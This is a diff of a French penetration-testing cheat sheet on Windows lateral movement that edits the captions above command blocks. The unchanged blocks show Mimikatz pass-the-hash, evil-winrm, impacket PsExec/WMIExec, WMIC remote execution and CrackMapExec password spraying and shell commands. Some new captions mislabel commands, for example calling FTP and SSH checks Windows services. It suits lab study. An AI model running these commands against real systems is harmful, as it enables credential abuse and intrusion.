@@ -11,14 +11,14 @@ Référence des accès distants et protocoles entre hôtes Windows.
 ## Techniques et préparation
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.</p>
+<p class="oscp-command-note">Exécuter un script PowerShell.</p>
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File [script].ps1
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mimikatz.</p>
+<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
 mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell
@@ -33,7 +33,7 @@ mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /ru
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil evil-winrm.</p>
+<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>
 
 ```bash
 evil-winrm -u <username> -p <password> -i <target_ip>
@@ -51,7 +51,7 @@ evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTL
 ### PsExec
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-psexec.</p>
+<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>
 
 ```bash
 impacket-psexec <username>:<password>@<target_ip>
@@ -68,7 +68,7 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 ### VMIExec
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil impacket-wmiexec.</p>
+<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
 
 ```bash
 impacket-wmiexec <username>:<password>@<target_ip>
@@ -90,7 +90,7 @@ Observer les permissions et la configuration de Windows.
 ### DCOM (Distributed Component Object Model)
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil get-itemproperty.</p>
+<p class="oscp-command-note">Lire une clé du Registre Windows.</p>
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
@@ -101,7 +101,7 @@ Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
 `Invoke-Command`  
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « DCOM (Distributed Component Object Model) ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « DCOM (Distributed Component Object Model) ».</p>
 
 ```powershell
 $targetIP = "<target_ip>"  # Replace with the actual target IP
@@ -118,7 +118,7 @@ Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ip
 `vmiexec`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil wmiexec.py.</p>
+<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>
 
 ```bash
 wmiexec.py <domain>/<username>:<password>@<target_ip>
@@ -130,7 +130,7 @@ wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
 ### PsExec
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil psexec.exe.</p>
+
 
 ```bash
 psexec.exe \\<target_ip> -u <username> -p <password> cmd
@@ -142,7 +142,7 @@ psexec.exe \\<target_ip> -u <username> -p <password> cmd
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « WinRM ».</p>
+<p class="oscp-command-note">Script PowerShell dans la rubrique « WinRM ».</p>
 
 ```powershell
 $username = '<username>';
@@ -156,7 +156,7 @@ New-PSSession -ComputerName <target_ip> -Credential $credential;
 ### WinRS
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil winrs.</p>
+
 
 ```powershell
 winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
@@ -166,7 +166,7 @@ winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
 ### WMIC
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil wmic.</p>
+<p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
 wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
@@ -187,7 +187,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `--delay` (délai) · `--max-retries` (limite des tentatives)  
 
 
-<p class="oscp-command-note">Énumérer les informations SMB ou RPC.</p>
+<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>
 
 ```bash
 # Check policies with a tool like rpcclient
@@ -201,7 +201,7 @@ crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
 ```
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Use CrackMapExec's --target option to narrow focus
@@ -213,7 +213,7 @@ crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwor
 `--local-auth` (authentification locale)  
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+
 
 ```bash
 crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
@@ -235,7 +235,7 @@ crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
 ```
 
 
-<p class="oscp-command-note">Examiner les ports et les services avec Nmap.</p>
+<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>
 
 ```bash
 nmap -p 5985,1433,445,3389 <TARGET_IP>
@@ -246,7 +246,7 @@ nmap -p 5985,1433,445,3389 <TARGET_IP>
 `-p` · `-H`  
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Test both passwords and NTLM hashes
@@ -259,7 +259,7 @@ crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOM
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Test a single password across all users in the domain
@@ -296,7 +296,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "w
 Observer les permissions et la configuration de Windows.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Test credentials on the main domain via WinRM
@@ -342,7 +342,7 @@ crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x 
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Gain a shell using valid credentials
@@ -365,7 +365,7 @@ crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "w
 ### VMIExec
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Gain a shell using valid credentials
@@ -381,7 +381,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exe
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Authenticate and enumerate users on the main domain
@@ -406,7 +406,7 @@ crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUB
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Test main domain credentials on an MSSQL server
@@ -438,7 +438,7 @@ crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 ### RDP
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 # Test credentials against an RDP service on the main domain
@@ -472,7 +472,7 @@ crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
@@ -482,7 +482,7 @@ crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 ### SSH
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
@@ -494,7 +494,7 @@ crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Examiner le service distant avec les paramètres fournis.</p>
+<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
 
 ```bash
 crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
